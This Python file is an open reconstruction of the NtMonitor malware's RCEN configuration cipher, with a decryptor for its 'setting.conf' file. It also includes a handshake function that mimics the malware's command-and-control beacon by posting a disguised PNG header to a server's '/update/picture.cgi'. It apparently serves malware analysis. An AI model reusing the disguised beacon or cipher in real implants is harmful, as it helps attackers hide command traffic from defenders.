# Technique reconstruction, not the original Windows NtMonitor executable.
# RCEN decoder transcribed from Rapid7's published reverse engineering.
import struct
import urllib.request

def _f9(t):
    r = ((8 * t) & 0x1ff) | (t >> 6)
    return r ^ (r >> 4)

class Rcen:
    def __init__(self, key):
        if not key:
            raise ValueError("empty key")
        kl = len(key)
        s = list(range(512))
        k = [(i & 0xff) ^ key[i % kl] for i in range(512)]
        c = [0x12345678, 0x9abcdef0, 0xfedcba98, 0x76543210]
        for _ in range(3):
            m = 0
            for j in range(512):
                a3 = s[j]
                m = (a3 + (c[j & 3] >> (j & 7)) + m + k[j]) & 0x1ff
                x = (a3 ^ key[j % kl]) & 0x1ff
                y = (s[m] ^ key[m % kl]) & 0x1ff
                s[j] = _f9(y)
                s[m] = _f9(x)
                b = key[j % kl]
                c[0] = (b ^ (2 * c[0])) & 0xffffffff
                c[1] = ((c[1] >> 1) ^ (b << 8)) & 0xffffffff
                c[2] = (c[2] ^ (0x9E3779B1 * b)) & 0xffffffff
                c[3] = (1103515245 * (b + c[3]) + 12345) & 0xffffffff
        self.s, self.c = s, c
        self.p = (key[0] ^ key[kl - 1]) & 0xffff
        self.q = (key[1] ^ key[kl >> 1]) % 512
        self.r = (7 * kl) & 0xf

    def _gen(self):
        s, c = self.s, self.c
        self.p = p = (self.p + (c[0] & 3) + 1) & 0x1ff
        self.q = q = (self.q + s[p] + (c[1] & 7)) & 0x1ff
        v5, v6 = s[p], s[q]
        s[p], s[q] = v6, v5
        v4 = (v6 + (c[2] & 0xf)) & 0xffff
        v8 = ((v5 & 0xff) ^ (c[3] >> self.r) ^ s[(v5 + v4) & 0x1ff]) & 0x1ff
        g = _f9(v8)
        c[0] = (g ^ (2 * c[0])) & 0xffffffff
        c[1] = ((c[1] >> 1) ^ (8 * v5)) & 0xffffffff
        self.r = (self.r + 1) % 16
        return g & 0xff

    def crypt(self, data):
        out = bytearray(data)
        c = self.c
        for _ in range(64):
            self._gen()
        for i in range(len(out)):
            t = (i ^ self._gen()) & 0xff
            ks = ((t << 1) | (t >> 7)) & 0xff
            out[i] ^= ks
            if ((i + 1) & 0xf) == 0:
                old3 = c[3]
                c[0] = (ks ^ (2 * c[0])) & 0xffffffff
                c[1] = ((c[1] >> 1) ^ (ks << 8)) & 0xffffffff
                c[2] = (c[2] ^ (0x9e3779b1 * ks)) & 0xffffffff
                c[3] = (1103515245 * (ks + old3) + 12345) & 0xffffffff
        return bytes(out)


FILE_MAGIC = b'RCEN'

def decrypt_file(raw):
    if raw[:4] != FILE_MAGIC:
        raise ValueError("missing RCEN magic")
    (kl,) = struct.unpack_from("<I", raw, 4)
    key = raw[8:8 + kl]
    (dl,) = struct.unpack_from("<I", raw, 8 + kl)
    ct = raw[12 + kl:12 + kl + dl]
    if len(key) != kl or len(ct) != dl:
        raise ValueError("truncated file")
    return key, Rcen(key).crypt(ct)


def load_configuration(path="setting.conf"):
    with open(path, "rb") as stream:
        key, config = decrypt_file(stream.read())
    return config


def handshake(server):
    watermark = b'\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR'
    request = urllib.request.Request(
        server + "/update/picture.cgi",
        data=watermark,
        headers={"Content-Type": "image/jpeg"},
        method="POST",
    )
    return urllib.request.urlopen(request)
